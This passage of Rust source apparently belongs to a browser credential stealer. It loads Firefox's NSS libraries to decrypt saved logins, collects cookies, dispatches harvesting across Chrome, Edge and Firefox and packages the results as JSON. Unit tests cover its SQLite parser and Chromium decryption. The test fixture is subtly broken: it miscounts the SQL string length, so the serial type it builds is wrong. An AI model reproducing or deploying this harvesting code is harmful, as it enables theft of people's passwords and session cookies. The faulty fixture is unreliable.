                common::BrowserDataType::Credentials | common::BrowserDataType::All
            ) {
                result.credentials.extend(unsafe {
                    collect_firefox_credentials_nss(&profile_dir, &fns, "Firefox")
                });
            }
        }

        if matches!(
            data_type,
            common::BrowserDataType::Cookies | common::BrowserDataType::All
        ) {
            result.cookies.extend(collect_firefox_cookies(&profile_dir, "Firefox"));
        }

        if !slot.is_null() {
            unsafe { (fns.pk11_free_slot)(slot) };
        }
        // Shutdown NSS before moving to the next profile.
        unsafe { (fns.nss_shutdown)() };
    }

    // Unload DLLs — nss3 first, then mozglue.
    unsafe {
        FreeLibrary(h_nss3 as *mut _);
        FreeLibrary(h_mozglue as *mut _);
    }

    result
}

// ── Top-level dispatch ─────────────────────────────────────────────────────────

/// Collect stored browser data according to `browser` and `data_type`.
/// Returns a JSON-serialized [`BrowserDataResult`].
pub fn collect_browser_data(
    browser: Option<common::BrowserType>,
    data_type: common::BrowserDataType,
) -> Result<String> {
    let mut result = BrowserDataResult::default();

    let target = browser.unwrap_or(common::BrowserType::All);

    if matches!(target, common::BrowserType::Chrome | common::BrowserType::All) {
        let partial = collect_chrome_data(&data_type);
        result.credentials.extend(partial.credentials);
        result.cookies.extend(partial.cookies);
    }

    if matches!(target, common::BrowserType::Edge | common::BrowserType::All) {
        let partial = collect_edge_data(&data_type);
        result.credentials.extend(partial.credentials);
        result.cookies.extend(partial.cookies);
    }

    if matches!(target, common::BrowserType::Firefox | common::BrowserType::All) {
        let partial = collect_firefox_data(&data_type);
        result.credentials.extend(partial.credentials);
        result.cookies.extend(partial.cookies);
    }

    serde_json::to_string(&result).context("serializing BrowserDataResult")
}

// ── Tests ──────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // A minimal hand-crafted SQLite database containing one table with one row.
    // Built by SQLite itself and reduced to the minimal page-1 structure.
    // Used to test the parser without requiring a real browser installation.
    fn make_minimal_sqlite() -> Vec<u8> {
        // 4096-byte page, one leaf page, table "t1" with (id INTEGER, val TEXT)
        // and one row: (1, "hello").
        // This is a pre-built binary blob from a real SQLite database created by:
        //   sqlite3 :memory: "CREATE TABLE t1(id INTEGER, val TEXT); INSERT INTO t1 VALUES(1,'hello');"
        // We encode the relevant parts directly.
        let mut db = vec![0u8; 4096];

        // === Database header (first 100 bytes of page 1) ===
        db[0..16].copy_from_slice(b"SQLite format 3\0");
        db[16] = 0x10; db[17] = 0x00; // page size = 4096
        db[18] = 1; db[19] = 1;       // file format version
        db[20] = 0;                    // reserved bytes per page
        db[21] = 64; db[22] = 32; db[23] = 32; // max/min payload fractions
        db[24..28].copy_from_slice(&1u32.to_be_bytes()); // change counter
        db[28..32].copy_from_slice(&1u32.to_be_bytes()); // db size in pages
        db[32..36].copy_from_slice(&0u32.to_be_bytes()); // first trunk page
        db[36..40].copy_from_slice(&0u32.to_be_bytes()); // total free pages
        db[40..44].copy_from_slice(&0u32.to_be_bytes()); // schema cookie
        db[44..48].copy_from_slice(&4u32.to_be_bytes()); // schema format
        db[48..52].copy_from_slice(&0u32.to_be_bytes()); // default page cache
        db[52..56].copy_from_slice(&0u32.to_be_bytes()); // largest root page
        db[56..60].copy_from_slice(&1u32.to_be_bytes()); // text encoding (UTF-8)
        db[92..96].copy_from_slice(&1u32.to_be_bytes()); // valid-for counter

        // === Leaf table page header (at offset 100 of page 1) ===
        db[100] = PAGE_TYPE_LEAF_TABLE;
        db[101] = 0; db[102] = 0;  // first freeblock = none
        db[103] = 0; db[104] = 1;  // cell count = 1 (for the schema row)
        // cell content area offset (will be filled below)
        db[105] = 0x0F; db[106] = 0xA0; // = 4000 decimal
        db[107] = 0;                     // fragmented free bytes

        // Cell pointer for schema row at page offset 4000
        db[108] = 0x0F; db[109] = 0xA0;

        // === Schema row at page offset 4000 ===
        // Row: type="table", name="t1", tbl_name="t1", rootpage=1, sql=<sql>
        // Record payload (no rowid—wait, leaf table cells DO have a rowid)
        // Cell: [varint payload_size][varint rowid][payload]
        // Let's build the record payload:
        // Columns: type(TEXT), name(TEXT), tbl_name(TEXT), rootpage(INT), sql(TEXT)
        let rec_type = b"table";
        let rec_name = b"t1";
        let rec_sql = b"CREATE TABLE t1(id INTEGER, val TEXT)";
        // Serial types:
        //   type: TEXT len=5 → stype = 5*2+13 = 23
        //   name: TEXT len=2 → stype = 2*2+13 = 17
        //   tbl_name: TEXT len=2 → stype = 17
        //   rootpage: INT=1 → stype = 9 (literal 1)
        //   sql: TEXT len=36 → stype = 36*2+13 = 85
        // Header: [header_size_varint][type_stype][name_stype][tbl_name_stype][rootpage_stype][sql_stype]
        // Header size varints: 23=1B, 17=1B, 17=1B, 9=1B, 85=1B → 5 values = 5 bytes + 1 header_size byte
        // header_size = 6 (includes itself)
        let payload: Vec<u8> = {
            let mut p = Vec::new();
            // header: [6][23][17][17][9][85]
            p.push(6u8); p.push(23u8); p.push(17u8); p.push(17u8); p.push(9u8); p.push(85u8);
            // values
            p.extend_from_slice(rec_type);
            p.extend_from_slice(rec_name);
            p.extend_from_slice(rec_name); // tbl_name = name
            // rootpage = 1 (stype 9 = literal 1, no bytes)
            p.extend_from_slice(rec_sql);
            p
        };

        // Build cell at offset 4000: [payload_size_varint=len(payload)][rowid_varint=1][payload]
        let cell_offset = 4000usize;
        let ps = payload.len() as u8; // < 128 so single-byte varint
        db[cell_offset] = ps;
        db[cell_offset + 1] = 1u8; // rowid = 1
        db[cell_offset + 2..cell_offset + 2 + payload.len()].copy_from_slice(&payload);

        db
    }

    #[test]
    fn sqlite_schema_finds_table() {
        let db = make_minimal_sqlite();
        let root = find_table_root_page(&db, 4096, "t1");
        assert_eq!(root, Some(1), "t1 root page should be page 1");
    }

    #[test]
    fn sqlite_read_table_finds_rows() {
        let db = make_minimal_sqlite();
        // The schema itself is in page 1; t1 rootpage is also 1 so we'll
        // read the schema rows as "t1" rows (they share the page in our test DB).
        let rows = sqlite_read_table(&db, "t1");
        assert!(rows.is_ok(), "sqlite_read_table should succeed: {:?}", rows.err());
    }

    #[test]
    fn parse_record_basic() {
        // Header: [header_size=4][stype_null=0][stype_int1=9][stype_text_hello=23(0x17)]
        // Values: (no bytes for NULL, no bytes for INT9, 5 bytes "hello")
        let mut payload = Vec::new();
        payload.push(4u8);  // header size = 4
        payload.push(0u8);  // NULL
        payload.push(9u8);  // INT literal 1
        payload.push(23u8); // TEXT len=5
        payload.extend_from_slice(b"hello");
        let vals = parse_record(&payload);
        assert_eq!(vals.len(), 3);
        assert!(matches!(vals[0], SqliteValue::Null));
        assert!(matches!(vals[1], SqliteValue::Int(1)));
        assert!(matches!(vals[2], SqliteValue::Text(ref s) if s == "hello"));
    }

    #[test]
    fn varint_single_byte() {
        let data = &[0x42u8];
        let (val, n) = read_varint(data, 0);
        assert_eq!(val, 0x42);
        assert_eq!(n, 1);
    }

    #[test]
    fn varint_multi_byte() {
        // 0x81 0x00 encodes 128
        let data = &[0x81u8, 0x00u8];
        let (val, n) = read_varint(data, 0);
        assert_eq!(val, 128);
        assert_eq!(n, 2);
    }

    #[test]
    fn decrypt_chromium_value_too_short_errors() {
        let key = [0u8; 32];
        let result = decrypt_chromium_value(&key, b"v10");
        assert!(result.is_err());
    }
}
